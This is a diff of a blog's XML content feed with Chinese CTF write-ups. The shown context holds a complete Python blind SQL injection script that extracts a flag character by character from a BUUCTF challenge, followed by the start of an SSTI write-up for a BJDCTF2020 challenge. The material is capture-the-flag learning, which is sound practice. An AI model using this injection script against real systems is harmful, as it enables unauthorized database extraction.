@@ -71,15 +71,7 @@ https://www.bilibili.com/video/BV1Zs42137tf
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://bdff4bff-23c2-43c2-969e-74bedf958792.node3.buuoj.cn/index.php&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">num = 0  # 用了来判断是不是flag已经拼完整了</span><br><span class="line">for i in range(1, 60):</span><br><span class="line"></span><br><span class="line">    if num == 1:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    for j in range(32, 128):</span><br><span class="line"></span><br><span class="line">        payload = &quot;if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)&quot; % (i, j)</span><br><span class="line">        # print(str((i-1)*96+j-32)+&quot;:~&quot;+payload+&quot;~&quot;)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;id&quot;: payload,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line"></span><br><span class="line">        if &quot;Hello&quot; in r.text:</span><br><span class="line">            x = chr(j)</span><br><span class="line">            result += str(x)</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        if &quot;&#125;&quot; in result:</span><br><span class="line">            print(result)</span><br><span class="line">            num = 1</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
 
 <p>得到flag  </p>
-]]></content>
-      <tags>
-        <tag>周报</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSTI</title>
-    <url>/posts/47d18edd/</url>
-    <content><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>做了一道BUUCTF题，接触了许多新的知识点。在这里记录一下<br>题目在这：</p>
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>做了一道BUUCTF题，接触了许多新的知识点。在这里记录一下<br>题目在这：</p>
 <blockquote>
 <p>👉 <a href="https://buuoj.cn/challenges#[BJDCTF2020]Cookie%20is%20so%20stable">BJDCTF2020 题目链接</a></p>
 </blockquote>
